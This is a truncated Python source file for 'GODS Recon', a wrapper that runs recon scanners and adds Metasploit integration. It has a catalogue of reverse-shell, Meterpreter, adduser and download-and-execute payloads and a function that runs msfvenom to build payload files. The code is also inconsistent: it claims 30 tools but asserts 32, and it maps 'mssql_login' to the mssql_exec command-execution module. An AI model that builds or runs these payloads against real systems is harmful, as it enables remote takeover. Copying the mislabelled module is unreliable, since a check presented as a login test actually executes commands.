#!/usr/bin/env python3
"""GODS Recon external-tool registry and safe interactive runner.

The registry contains exactly 30 optional integrations. A tool is considered
available only when its executable is present (or, for the small built-in HTTP
checks, when the Python runtime can perform the check).
"""
from __future__ import annotations

import os
import shlex
import shutil
import subprocess
from dataclasses import dataclass
from typing import Callable, Optional
from urllib.parse import urlparse

from utils.helpers import C


@dataclass(frozen=True)
class ToolSpec:
    name: str
    command: Optional[str]
    category: str
    description: str
    builder: Callable[[str, dict], list[str]]
    needs_url: bool = False


def _url(target: str) -> str:
    target = str(target).strip()
    if target.startswith(("http://", "https://")):
        return target.rstrip("/")
    return "https://" + target.rstrip("/")


def _host(target: str) -> str:
    parsed = urlparse(_url(target))
    return parsed.hostname or target.split("/")[0].split(":")[0]


def _positive_int(value, default, minimum=1, maximum=100000):
    try:
        n = int(str(value).strip())
    except (TypeError, ValueError):
        return default
    return max(minimum, min(n, maximum))


def _port_value(value, default=443):
    return _positive_int(value, default, 1, 65535)


def _port_spec(value, default="80,443"):
    value = str(value or "").strip()
    if not value:
        return default
    # Accept comma-separated ports and ranges such as 80,443,8000-8080.
    for part in value.split(","):
        part = part.strip()
        if not part:
            return default
        if "-" in part:
            a, b = part.split("-", 1)
            if not (a.isdigit() and b.isdigit() and 1 <= int(a) <= int(b) <= 65535):
                return default
        elif not (part.isdigit() and 1 <= int(part) <= 65535):
            return default
    return value


def _nmap(target, o):
    cmd = ["nmap"]
    mode = o.get("ports", "common")
    ports = {"common": "21,22,25,53,80,110,139,143,443,445,3389,8080", "top": "--top-ports 100"}
    if mode == "custom":
        cmd += ["-p", _port_spec(o.get("custom_ports"), "80,443")]
    elif mode == "top":
        cmd += ["--top-ports", str(_positive_int(o.get("top_n"), 100, 1, 65535))]
    elif mode == "all":
        cmd += ["-p-"]
    else:
        cmd += ["-p", ports["common"]]
    if o.get("service", True): cmd.append("-sV")
    if o.get("udp", False): cmd.append("-sU")
    timing = str(o.get("timing", "-T3"))
    if timing in {"-T0", "-T1", "-T2", "-T3", "-T4", "-T5"}:
        cmd.append(timing)
    return cmd + [_host(target)]


def _masscan(target, o):
    return ["masscan", _host(target), "-p", _port_spec(o.get("custom_ports"), "80,443"),
            "--rate", str(_positive_int(o.get("rate"), 100, 1, 1000000))]


def _rustscan(target, o):
    cmd = ["rustscan", "-a", _host(target), "--ulimit", str(o.get("ulimit", 5000))]
    if o.get("ports"): cmd += ["-p", _port_spec(o["ports"])]
    return cmd


def _naabu(target, o):
    cmd = ["naabu", "-host", _host(target)]
    if o.get("ports"): cmd += ["-p", _port_spec(o["ports"])]
    else: cmd += ["-top-ports", str(_positive_int(o.get("top_n"), 100, 1, 10000))]
    return cmd


def _httpx(target, o):
    cmd = ["httpx", "-u", _url(target), "-silent"]
    if o.get("status", True): cmd.append("-status-code")
    if o.get("title", True): cmd.append("-title")
    if o.get("tech", True): cmd.append("-tech-detect")
    return cmd


def _curl(target, o):
    cmd = ["curl", "-L" if o.get("redirects", True) else "-I", "-sS", "-D", "-", "-o", os.devnull, _url(target)]
    if "-I" not in cmd: cmd.insert(1, "-I")
    return cmd


def _wget(target, o):
    return ["wget", "--server-response", "--spider", _url(target)]


def _whatweb(target, o):
    return ["whatweb", "--no-errors", _url(target)]


def _nikto(target, o):
    return ["nikto", "-h", _url(target), "-nointeractive"]


def _nuclei(target, o):
    cmd = ["nuclei", "-u", _url(target), "-silent", "-rate-limit", str(o.get("rate", 10))]
    if o.get("severity"): cmd += ["-severity", o["severity"]]
    return cmd


def _gobuster(target, o):
    cmd = ["gobuster", "dir", "-u", _url(target), "-q"]
    cmd += ["-w", o.get("wordlist", "")]
    if o.get("extensions"): cmd += ["-x", o["extensions"]]
    cmd += ["-t", str(o.get("threads", 10))]
    return cmd


def _ffuf(target, o):
    return ["ffuf", "-u", _url(target).rstrip("/") + "/FUZZ", "-w", o.get("wordlist", ""), "-mc", "200,204,301,302,307,401,403", "-t", str(o.get("threads", 10)), "-s"]


def _feroxbuster(target, o):
    cmd = ["feroxbuster", "-u", _url(target), "--quiet", "-t", str(o.get("threads", 10))]
    if o.get("wordlist"): cmd += ["-w", o["wordlist"]]
    return cmd


def _dirsearch(target, o):
    cmd = ["dirsearch", "-u", _url(target), "--format", "plain"]
    if o.get("wordlist"): cmd += ["-w", o["wordlist"]]
    return cmd


def _wfuzz(target, o):
    return ["wfuzz", "-c", "-z", f"file,{o.get('wordlist','')}", "--hc", "404", _url(target).rstrip("/") + "/FUZZ"]


def _gau(target, o):
    return ["gau", _host(target)]


def _waybackurls(target, o):
    return ["waybackurls", _host(target)]


def _hakrawler(target, o):
    return ["hakrawler", "-url", _url(target), "-depth", str(o.get("depth", 2)), "-plain"]


def _katana(target, o):
    return ["katana", "-u", _url(target), "-silent", "-depth", str(o.get("depth", 2))]


def _subfinder(target, o):
    return ["subfinder", "-d", _host(target), "-silent"]


def _amass(target, o):
    return ["amass", "enum", "-passive", "-d", _host(target)]


def _dnsx(target, o):
    return ["dnsx", "-d", _host(target), "-a", "-aaaa", "-mx", "-ns", "-txt", "-silent"]


def _dig(target, o):
    return ["dig", _host(target), o.get("record", "A"), "+short"]


def _hostcmd(target, o):
    return ["host", _host(target)]


def _whois(target, o):
    return ["whois", _host(target)]


def _wafw00f(target, o):
    return ["wafw00f", _url(target)]


def _openssl(target, o):
    host = _host(target)
    port = str(o.get("port", 443))
    return ["openssl", "s_client", "-connect", f"{host}:{port}", "-servername", host, "-brief"]


def _sslscan(target, o):
    return ["sslscan", f"{_host(target)}:{o.get('port', 443)}"]


def _testssl(target, o):
    return ["testssl.sh", "--quiet", _url(target)]


def _zap(target, o):
    # zap-cli syntax varies between releases; keep this adapter conservative.
    return ["zap-cli", "quick-scan", _url(target)]


# ═══════════════════════════════════════════════════════════════════════════════════════
# METASPLOIT MODULES
# ═══════════════════════════════════════════════════════════════════════════════════════

def _msfconsole(target, o):
    """
    Metasploit Framework integration.
    Returns a resource script for msfconsole execution.
    """
    module = o.get("module", " auxiliary/scanner/http/title")
    rhosts = _host(target)
    rport = str(o.get("port", 80))
    ssl = "true" if _url(target).startswith("https") else "false"
    
    resource_script = f"""
use {module}
set RHOSTS {rhosts}
set RPORT {rport}
set SSL {ssl}
set VERBOSE true
run
exit
"""
    return ["msfconsole", "-q", "-x", resource_script]


def _msfvenom(target, o):
    """Generate payloads with msfvenom."""
    payload = o.get("payload", "linux/x64/meterpreter/reverse_tcp")
    lhost = o.get("lhost", "127.0.0.1")
    lport = str(o.get("lport", 4444))
    format = o.get("format", "elf")
    output = o.get("output", "/tmp/payload.bin")
    
    return ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", format, "-o", output]


# ═══════════════════════════════════════════════════════════════════════════════════════
# METASPLOIT PAYLOAD DATABASE
# ═══════════════════════════════════════════════════════════════════════════════════════

METASPLOIT_PAYLOADS = {
    # Linux x64
    "linux/x64/meterpreter/reverse_tcp": {
        "os": "linux", "arch": "x64", "type": "meterpreter", "stageless": False,
        "description": "Linux x64 Meterpreter reverse TCP"
    },
    "linux/x64/meterpreter/reverse_tcp_uuid": {
        "os": "linux", "arch": "x64", "type": "meterpreter", "stageless": False,
        "description": "Linux x64 Meterpreter reverse TCP with UUID"
    },
    "linux/x64/shell/reverse_tcp": {
        "os": "linux", "arch": "x64", "type": "shell", "stageless": False,
        "description": "Linux x64 shell reverse TCP"
    },
    "linux/x64/shell_bind_tcp": {
        "os": "linux", "arch": "x64", "type": "shell", "stageless": True,
        "description": "Linux x64 shell bind TCP"
    },
    "linux/x64/exec": {
        "os": "linux", "arch": "x64", "type": "exec", "stageless": True,
        "description": "Linux x64 execute command"
    },
    "linux/x64/adduser": {
        "os": "linux", "arch": "x64", "type": "adduser", "stageless": True,
        "description": "Linux x64 add new user"
    },
    
    # Linux x86
    "linux/x86/meterpreter/reverse_tcp": {
        "os": "linux", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "Linux x86 Meterpreter reverse TCP"
    },
    "linux/x86/shell/reverse_tcp": {
        "os": "linux", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Linux x86 shell reverse TCP"
    },
    "linux/x86/shell_bind_tcp": {
        "os": "linux", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Linux x86 shell bind TCP"
    },
    "linux/x86/chmod": {
        "os": "linux", "arch": "x86", "type": "chmod", "stageless": True,
        "description": "Linux x86 chmod"
    },
    
    # Windows x64
    "windows/x64/meterpreter/reverse_tcp": {
        "os": "windows", "arch": "x64", "type": "meterpreter", "stageless": False,
        "description": "Windows x64 Meterpreter reverse TCP"
    },
    "windows/x64/meterpreter/reverse_tcp_uuid": {
        "os": "windows", "arch": "x64", "type": "meterpreter", "stageless": False,
        "description": "Windows x64 Meterpreter reverse TCP with UUID"
    },
    "windows/x64/shell/reverse_tcp": {
        "os": "windows", "arch": "x64", "type": "shell", "stageless": False,
        "description": "Windows x64 shell reverse TCP"
    },
    "windows/x64/shell_reverse_tcp": {
        "os": "windows", "arch": "x64", "type": "shell", "stageless": True,
        "description": "Windows x64 shell reverse TCP"
    },
    
    # Windows x86
    "windows/meterpreter/reverse_tcp": {
        "os": "windows", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "Windows Meterpreter reverse TCP"
    },
    "windows/meterpreter/reverse_tcp_uuid": {
        "os": "windows", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "Windows Meterpreter reverse TCP with UUID"
    },
    "windows/shell/reverse_tcp": {
        "os": "windows", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Windows shell reverse TCP"
    },
    "windows/shell_reverse_tcp": {
        "os": "windows", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Windows shell reverse TCP"
    },
    "windows/exec": {
        "os": "windows", "arch": "x86", "type": "exec", "stageless": True,
        "description": "Windows execute command"
    },
    "windows/download_exec": {
        "os": "windows", "arch": "x86", "type": "download_exec", "stageless": True,
        "description": "Windows download and execute"
    },
    "windows/vncinject/reverse_tcp": {
        "os": "windows", "arch": "x86", "type": "vnc", "stageless": False,
        "description": "Windows VNC inject reverse TCP"
    },
    
    # macOS
    "osx/x64/meterpreter/reverse_tcp": {
        "os": "macos", "arch": "x64", "type": "meterpreter", "stageless": False,
        "description": "macOS x64 Meterpreter reverse TCP"
    },
    "osx/x64/shell_bind_tcp": {
        "os": "macos", "arch": "x64", "type": "shell", "stageless": True,
        "description": "macOS x64 shell bind TCP"
    },
    "osx/x64/shell_reverse_tcp": {
        "os": "macos", "arch": "x64", "type": "shell", "stageless": False,
        "description": "macOS x64 shell reverse TCP"
    },
    
    # PHP
    "php/meterpreter/reverse_tcp": {
        "os": "php", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "PHP Meterpreter reverse TCP"
    },
    "php/meterpreter/reverse_tcp_uuid": {
        "os": "php", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "PHP Meterpreter reverse TCP with UUID"
    },
    "php/shell_reverse_tcp": {
        "os": "php", "arch": "x86", "type": "shell", "stageless": False,
        "description": "PHP shell reverse TCP"
    },
    "php/exec": {
        "os": "php", "arch": "x86", "type": "exec", "stageless": True,
        "description": "PHP execute command"
    },
    "php/download_exec": {
        "os": "php", "arch": "x86", "type": "download_exec", "stageless": True,
        "description": "PHP download and execute"
    },
    
    # Python
    "python/meterpreter/reverse_tcp": {
        "os": "python", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "Python Meterpreter reverse TCP"
    },
    "python/meterpreter/reverse_tcp_uuid": {
        "os": "python", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "Python Meterpreter reverse TCP with UUID"
    },
    "python/shell_reverse_tcp": {
        "os": "python", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Python shell reverse TCP"
    },
    "python/shell_bind_tcp": {
        "os": "python", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Python shell bind TCP"
    },
    
    # Bash
    "cmd/unix/reverse_bash": {
        "os": "linux", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Bash reverse shell"
    },
    "cmd/unix/reverse_bash_udp": {
        "os": "linux", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Bash UDP reverse shell"
    },
    
    # Java
    "java/meterpreter/reverse_tcp": {
        "os": "java", "arch": "x86", "type": "meterpreter", "stageless": False,
        "description": "Java Meterpreter reverse TCP"
    },
    "java/shell_reverse_tcp": {
        "os": "java", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Java shell reverse TCP"
    },
    
    # Android
    "android/meterpreter/reverse_tcp": {
        "os": "android", "arch": "arm", "type": "meterpreter", "stageless": False,
        "description": "Android Meterpreter reverse TCP"
    },
    "android/meterpreter/reverse_tcp_uuid": {
        "os": "android", "arch": "arm", "type": "meterpreter", "stageless": False,
        "description": "Android Meterpreter reverse TCP with UUID"
    },
    "android/shell/reverse_tcp": {
        "os": "android", "arch": "arm", "type": "shell", "stageless": False,
        "description": "Android shell reverse TCP"
    },
    
    # NodeJS
    "nodejs/shell_reverse_tcp": {
        "os": "nodejs", "arch": "x86", "type": "shell", "stageless": False,
        "description": "NodeJS shell reverse TCP"
    },
    
    # Ruby
    "ruby/shell_reverse_tcp": {
        "os": "ruby", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Ruby shell reverse TCP"
    },
    "ruby/shell_bind_tcp": {
        "os": "ruby", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Ruby shell bind TCP"
    },
    
    # Perl
    "perl/shell_reverse_tcp": {
        "os": "perl", "arch": "x86", "type": "shell", "stageless": False,
        "description": "Perl shell reverse TCP"
    },
    "perl/shell_bind_tcp": {
        "os": "perl", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Perl shell bind TCP"
    },
    
    # Generic/Staged
    "generic/shell_bind_tcp": {
        "os": "generic", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Generic shell bind TCP"
    },
    "generic/shell_reverse_tcp": {
        "os": "generic", "arch": "x86", "type": "shell", "stageless": True,
        "description": "Generic shell reverse TCP"
    },
}


def search_msf_payloads(query: str, os_filter: str = None, arch_filter: str = None, 
                       type_filter: str = None) -> list:
    """
    Search Metasploit payloads by query string and optional filters.
    
    Args:
        query: Search string (matches payload name or description)
        os_filter: Filter by OS (linux, windows, macos, php, python, etc.)
        arch_filter: Filter by architecture (x64, x86, arm)
        type_filter: Filter by type (meterpreter, shell, exec, etc.)
    
    Returns:
        List of matching payloads with metadata
    """
    results = []
    query_lower = query.lower()
    
    for payload_name, metadata in METASPLOIT_PAYLOADS.items():
        # Check if payload matches query
        if query_lower and query_lower not in payload_name.lower():
            if query_lower not in metadata.get("description", "").lower():
                continue
        
        # Apply filters
        if os_filter and metadata.get("os") != os_filter.lower():
            continue
        if arch_filter and metadata.get("arch") != arch_filter.lower():
            continue
        if type_filter and metadata.get("type") != type_filter.lower():
            continue
        
        results.append({
            "name": payload_name,
            **metadata
        })
    
    return results


def list_msf_payloads_by_os() -> dict:
    """List all payloads grouped by OS."""
    by_os = {}
    for payload_name, metadata in METASPLOIT_PAYLOADS.items():
        os_name = metadata.get("os", "other")
        if os_name not in by_os:
            by_os[os_name] = []
        by_os[os_name].append({
            "name": payload_name,
            **metadata
        })
    return by_os


def generate_msf_payload(payload_name: str, lhost: str, lport: int = 4444,
                       output_path: str = "/tmp/payload.bin",
                       format: str = None) -> dict:
    """
    Generate a Metasploit payload using msfvenom.
    
    Args:
        payload_name: Name of the payload (e.g., "linux/x64/meterpreter/reverse_tcp")
        lhost: Local host IP for reverse connections
        lport: Local port for reverse connections
        output_path: Path to save the payload
        format: Output format (auto-detected from extension if None)
    
    Returns:
        dict with status, command, output, error
    """
    import os
    import subprocess
    
    # Check if msfvenom is available
    if not shutil.which("msfvenom"):
        return {
            "status": "error",
            "error": "msfvenom not found. Install Metasploit Framework.",
            "payload": payload_name,
            "command": None,
            "output": None
        }
    
    # Validate payload exists
    if payload_name not in METASPLOIT_PAYLOADS:
        return {
            "status": "error",
            "error": f"Unknown payload: {payload_name}",
            "payload": payload_name,
            "available_payloads": list(METASPLOIT_PAYLOADS.keys())[:10]
        }
    
    # Auto-detect format from output extension
    if format is None:
        ext = os.path.splitext(output_path)[1].lower().lstrip('.')
        format_map = {
            "elf": "elf", "exe": "exe", "dll": "dll", "ps1": "ps1",
            "py": "python", "php": "raw", "jar": "jar", "apk": "raw",
            "js": "js_le", "sh": "bash", "rb": "ruby", "pl": "perl"
        }
        format = format_map.get(ext, "elf")
    
    # Build command
    cmd = [
        "msfvenom",
        "-p", payload_name,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", format,
        "-o", output_path
    ]
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if result.returncode == 0:
            file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
            return {
                "status": "success",
                "payload": payload_name,
                "lhost": lhost,
                "lport": lport,
                "format": format,
                "output_path": output_path,
                "file_size": file_size,
                "command": " ".join(cmd),
                "output": result.stdout
            }
        else:
            return {
                "status": "error",
                "payload": payload_name,
                "error": result.stderr or "Payload generation failed",
                "command": " ".join(cmd)
            }
    except subprocess.TimeoutExpired:
        return {
            "status": "error",
            "payload": payload_name,
            "error": "Payload generation timed out",
            "command": " ".join(cmd)
        }
    except Exception as e:
        return {
            "status": "error",
            "payload": payload_name,
            "error": str(e),
            "command": " ".join(cmd) if 'cmd' in locals() else None
        }


def print_payload_search(query: str = "", os_filter: str = None, 
                        arch_filter: str = None, type_filter: str = None):
    """Print payload search results in a formatted table."""
    results = search_msf_payloads(query, os_filter, arch_filter, type_filter)
    
    if not results:
        print("\nNo payloads found matching your criteria.")
        return
    
    print(f"\n{'='*80}")
    print(f"Metasploit Payloads ({len(results)} found)")
    print(f"{'='*80}")
    
    if os_filter or arch_filter or type_filter:
        filters = []
        if os_filter: filters.append(f"OS: {os_filter}")
        if arch_filter: filters.append(f"Arch: {arch_filter}")
        if type_filter: filters.append(f"Type: {type_filter}")
        print(f"Filters: {', '.join(filters)}")
    
    print()
    print(f"{'Payload':<50} {'OS':<10} {'Arch':<6} {'Type':<12} Description")
    print("-" * 100)
    
    for p in results:
        name = p["name"][:48] + ".." if len(p["name"]) > 50 else p["name"]
        print(f"{name:<50} {p.get('os', '?'):<10} {p.get('arch', '?'):<6} {p.get('type', '?'):<12} {p.get('description', '')}")
    
    print()
    print(f"Total: {len(results)} payloads")
    print()


def print_payloads_by_os():
    """Print all payloads grouped by OS."""
    by_os = list_msf_payloads_by_os()
    
    print(f"\n{'='*80}")
    print("Metasploit Payloads by OS")
    print(f"{'='*80}")
    
    for os_name, payloads in sorted(by_os.items()):
        print(f"\n[{os_name.upper()}] ({len(payloads)} payloads)")
        print("-" * 60)
        
        for p in payloads[:10]:  # Show first 10 per OS
            print(f"  {p['name']}")
        
        if len(payloads) > 10:
            print(f"  ... and {len(payloads) - 10} more")
    
    print(f"\nTotal: {len(METASPLOIT_PAYLOADS)} payloads across {len(by_os)} operating systems")


# ═══════════════════════════════════════════════════════════════════════════════════════
# METASPLOIT AUXILIARY MODULES REGISTRY
# ═══════════════════════════════════════════════════════════════════════════════════════

METASPLOIT_MODULES = {
    # HTTP/Web
    "http_title": "auxiliary/scanner/http/title",
    "http_version": "auxiliary/scanner/http/http_version",
    "http_login": "auxiliary/scanner/http/http_login",
    "webdav_scanner": "auxiliary/scanner/http/webdav_scanner",
    "dir_scanner": "auxiliary/scanner/http/dir_scanner",
    "files_dir": "auxiliary/scanner/http/files_dir",
    "scanner/http/cert": "auxiliary/scanner/http/cert",
    
    # SMB
    "smb_version": "auxiliary/scanner/smb/smb_version",
    "smb_enum": "auxiliary/scanner/smb/smb_enumusers",
    "smb_login": "auxiliary/scanner/smb/smb_login",
    "smb2": "auxiliary/scanner/smb/smb2",
    
    # FTP
    "ftp_version": "auxiliary/scanner/ftp/ftp_version",
    "ftp_login": "auxiliary/scanner/ftp/ftp_login",
    "anonymous": "auxiliary/scanner/ftp/anonymous",
    
    # SSH
    "ssh_version": "auxiliary/scanner/ssh/ssh_version",
    "ssh_login": "auxiliary/scanner/ssh/ssh_login",
    
    # Telnet
    "telnet_version": "auxiliary/scanner/telnet/telnet_version",
    "telnet_login": "auxiliary/scanner/telnet/telnet_login",
    
    # SMTP
    "smtp_version": "auxiliary/scanner/smtp/smtp_version",
    "smtp_enum": "auxiliary/scanner/smtp/smtp_enum",
    
    # DNS
    "dns_enum": "auxiliary/scanner/dns/dns_enum",
    
    # SNMP
    "snmp_enum": "auxiliary/scanner/snmp/snmp_enum",
    "snmp_login": "auxiliary/scanner/snmp/snmp_login",
    
    # MSSQL
    "mssql_version": "auxiliary/scanner/mssql/mssql_version",
    "mssql_login": "auxiliary/admin/mssql/mssql_exec",
    
    # MySQL
    "mysql_version": "auxiliary/scanner/mysql/mysql_version",
    "mysql_login": "auxiliary/scanner/mysql/mysql_login",
    
    # PostgreSQL
    "postgres_version": "auxiliary/scanner/postgres/postgres_version",
    "postgres_login": "auxiliary/scanner/postgres/postgres_login",
    
    # VNC
    "vnc_none_auth": "auxiliary/scanner/vnc/vnc_none_auth",
    
    # RDP
    "rdp_scanner": "auxiliary/scanner/rdp/rdp_scanner",
    
    # IMAP
    "imap_version": "auxiliary/scanner/imap/imap_version",
    
    # POP3
    "pop3_version": "auxiliary/scanner/pop3/pop3_version",
    
    # NTP
    "ntp_version": "auxiliary/scanner/ntp/ntp_version",
    
    # Redis
    "redis_server": "auxiliary/scanner/redis/redis_server",
    
    # MongoDB
    "mongodb_version": "auxiliary/scanner/mongodb/mongodb_version",
    
    # Elasticsearch
    "elastic_unauth": "auxiliary/scanner/elasticsearch/elasticsearch_unauth",
    
    # Memcached
    "memcached_extractor": "auxiliary/scanner/memcached/memcached_extractor",
}


def run_metasploit_module(target: str, module_name: str, 
                         options: Optional[dict] = None) -> dict:
    """
    Run a Metasploit module by name.
    
    Args:
        target: Target host/IP
        module_name: Name from METASPLOIT_MODULES (e.g., "smb_version", "http_title")
        options: Optional dict with port, ssl, timeout, etc.
    
    Returns:
        dict with tool, status, stdout, stderr, returncode
    """
    if not shutil.which("msfconsole"):
        return {
            "tool": "metasploit",
            "status": "unavailable",
            "stdout": "",
            "stderr": "Metasploit not installed. Run: apt install metasploit-framework",
            "returncode": -1
        }
    
    if module_name not in METASPLOIT_MODULES:
        return {
            "tool": "metasploit",
            "status": "error",
            "stdout": "",
            "stderr": f"Unknown module: {module_name}. Available: {', '.join(METASPLOIT_MODULES.keys())}",
            "returncode": -1
        }
    
    module_path = METASPLOIT_MODULES[module_name]
    opts = options or {}
    rhost = _host(target)
    rport = str(opts.get("port", 80))
    ssl = "true" if opts.get("ssl", _url(target).startswith("https")) else "false"
    timeout = opts.get("timeout", 300)
    
    resource_script = f"""
use {module_path}
set RHOSTS {rhost}
set RPORT {rport}
set SSL {ssl}
set VERBOSE true
set THREADS 10
run
exit
"""
    try:
        cmd = ["msfconsole", "-q", "-x", resource_script]
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, errors="replace")
        status = "ok" if p.returncode == 0 else "failed"
        return {
            "tool": "metasploit",
            "module": module_name,
            "status": status,
            "stdout": p.stdout,
            "stderr": p.stderr,
            "returncode": p.returncode
        }
    except subprocess.TimeoutExpired:
        return {
            "tool": "metasploit",
            "module": module_name,
            "status": "timeout",
            "stdout": "",
            "stderr": "Module execution timed out",
            "returncode": -1
        }
    except Exception as e:
        return {
            "tool": "metasploit",
            "module": module_name,
            "status": "error",
            "stdout": "",
            "stderr": str(e),
            "returncode": -1
        }


def list_metasploit_modules() -> dict:
    """List all available Metasploit modules by category."""
    categories = {}
    for name, path in METASPLOIT_MODULES.items():
        # Extract category from path (e.g., "scanner/http" -> "http")
        parts = path.split("/")
        cat = parts[1] if len(parts) > 1 else "other"
        
        if cat not in categories:
            categories[cat] = []
        categories[cat].append({
            "name": name,
            "path": path,
            "description": f"Metasploit module: {path}"
        })
    return categories


# ═══════════════════════════════════════════════════════════════════════════════════════
# TOOL LIST - All integrated tools
# ═══════════════════════════════════════════════════════════════════════════════════════

TOOL_LIST = [
    ToolSpec("nmap", "nmap", "Network", "Port and service discovery", _nmap),
    ToolSpec("rustscan", "rustscan", "Network", "Fast port discovery", _rustscan),
    ToolSpec("masscan", "masscan", "Network", "High-speed TCP port scanner", _masscan),
    ToolSpec("naabu", "naabu", "Network", "Port discovery", _naabu),
    ToolSpec("httpx", "httpx", "HTTP", "HTTP probing and fingerprinting", _httpx),
    ToolSpec("curl", "curl", "HTTP", "HTTP header/status inspection", _curl, True),
    ToolSpec("wget", "wget", "HTTP", "HTTP response inspection", _wget, True),
    ToolSpec("whatweb", "whatweb", "Web", "Web technology fingerprinting", _whatweb, True),
    ToolSpec("nikto", "nikto", "Web", "Web server security checks", _nikto, True),
    ToolSpec("nuclei", "nuclei", "Web", "Template-based security checks", _nuclei, True),
    ToolSpec("gobuster", "gobuster", "Discovery", "Directory and file discovery", _gobuster, True),
    ToolSpec("ffuf", "ffuf", "Discovery", "Web fuzzing", _ffuf, True),
    ToolSpec("feroxbuster", "feroxbuster", "Discovery", "Content discovery", _feroxbuster, True),
    ToolSpec("dirsearch", "dirsearch", "Discovery", "Web path discovery", _dirsearch, True),
    ToolSpec("wfuzz", "wfuzz", "Discovery", "Web fuzzing", _wfuzz, True),
    ToolSpec("gau", "gau", "URLs", "Known URL collection", _gau),
    ToolSpec("waybackurls", "waybackurls", "URLs", "Wayback URL collection", _waybackurls),
    ToolSpec("hakrawler", "hakrawler", "URLs", "Link crawling", _hakrawler, True),
    ToolSpec("katana", "katana", "URLs", "Modern web crawling", _katana, True),
    ToolSpec("subfinder", "subfinder", "Domains", "Passive subdomain enumeration", _subfinder),
    ToolSpec("amass", "amass", "Domains", "Passive asset enumeration", _amass),
    ToolSpec("dnsx", "dnsx", "DNS", "DNS resolution and records", _dnsx),
    ToolSpec("dig", "dig", "DNS", "DNS record lookup", _dig),
    ToolSpec("host", "host", "DNS", "DNS host lookup", _hostcmd),
    ToolSpec("whois", "whois", "Domain", "WHOIS lookup", _whois),
    ToolSpec("wafw00f", "wafw00f", "Web", "WAF fingerprinting", _wafw00f, True),
    ToolSpec("openssl", "openssl", "TLS", "TLS certificate/handshake inspection", _openssl),
    ToolSpec("sslscan", "sslscan", "TLS", "TLS configuration inspection", _sslscan),
    ToolSpec("testssl.sh", "testssl.sh", "TLS", "TLS configuration analysis", _testssl, True),
    ToolSpec("zap-cli", "zap-cli", "Web", "OWASP ZAP command-line integration", _zap, True),
    # Metasploit Framework
    ToolSpec("msfconsole", "msfconsole", "Metasploit", "Metasploit Framework console", _msfconsole),
    ToolSpec("msfvenom", "msfvenom", "Metasploit", "Metasploit payload generator", _msfvenom),
]

assert len(TOOL_LIST) == 32
TOOL_INDEX = {t.name: t for t in TOOL_LIST}


def _tool_available(spec: ToolSpec) -> bool:
    """Detect the expected executable, not just an unrelated same-named binary."""
    if not spec.command or not shutil.which(spec.command):
        return False
    if spec.name == "httpx":
        # ProjectDiscovery httpx exposes these flags; Python's httpx CLI does not.
        try:
            p = subprocess.run([spec.command, "-h"], capture_output=True, text=True,
                               timeout=5, errors="replace")
            text = (p.stdout or "") + (p.stderr or "")
            return "-status-code" in text or "-tech-detect" in text
        except Exception:
            return False
    return True


def availability() -> dict[str, bool]:
    return {t.name: _tool_available(t) for t in TOOL_LIST}


def print_tool_catalog() -> None:
    status = availability()
    print()
    print("GODS Recon Tools")
    print()
    current = None
    for i, spec in enumerate(TOOL_LIST, 1):
        if spec.category != current:
            current = spec.category
            print(f"{current}")
        mark = f"{C.G}[OK]{C.X}" if status[spec.name] else f"{C.R}[MISS]{C.X}"
        print(f"  {i:02d}. {spec.name:<14} {mark}  {spec.description}")
    print()
    print("[OK] installed   [MISS] not installed")


def _ask_common(spec: ToolSpec) -> dict:
    """Collect validated, tool-specific options without crashing on bad input."""
    o = {}

    def ask_int(prompt, default, minimum, maximum):
        raw = input(prompt).strip()
        if not raw:
            return default
        try:
            value = int(raw)
        except ValueError:
            raise ValueError(f"invalid number: {raw}")
        if not minimum <= value <= maximum:
            raise ValueError(f"value must be between {minimum} and {maximum}")
        return value

    if spec.name == "nmap":
        print("Nmap options: common, top, custom, all")
        mode = input("[?] Ports mode [common]: ").strip().lower() or "common"
        if mode not in {"common", "top", "custom", "all"}:
            raise ValueError("ports mode must be common, top, custom, or all")
        o["ports"] = mode
        if mode == "custom":
            value = input("[?] Ports (e.g. 80,443 or 1-1000): ").strip()
            if not value:
                raise ValueError("ports are required for custom mode")
            o["custom_ports"] = _port_spec(value, "")
            if not o["custom_ports"]:
                raise ValueError("invalid port specification")
        if mode == "top":
            o["top_n"] = ask_int("[?] Top N [100]: ", 100, 1, 65535)
        o["service"] = input("[?] Service detection? [Y/n]: ").strip().lower() != "n"
        o["udp"] = input("[?] UDP scan? [y/N]: ").strip().lower() == "y"
        timing = input("[?] Timing [-T3]: ").strip() or "-T3"
        if timing not in {"-T0", "-T1", "-T2", "-T3", "-T4", "-T5"}:
            raise ValueError("timing must be -T0 through -T5")
        o["timing"] = timing

    elif spec.name in {"masscan", "rustscan", "naabu"}:
        value = input("[?] Ports [80,443]: ").strip() or "80,443"
        o["ports"] = _port_spec(value, "")
        o["custom_ports"] = o["ports"]
        if not o["ports"]:
            raise ValueError("invalid port specification")
        if spec.name == "masscan":
            o["rate"] = ask_int("[?] Rate [100]: ", 100, 1, 1000000)
        if spec.name == "naabu":
            o["top_n"] = ask_int("[?] Top N [100]: ", 100, 1, 10000)

    elif spec.name in {"gobuster", "ffuf", "feroxbuster", "dirsearch", "wfuzz"}:
        wordlist = input("[?] Wordlist path: ").strip()
        if not wordlist or not os.path.isfile(wordlist):
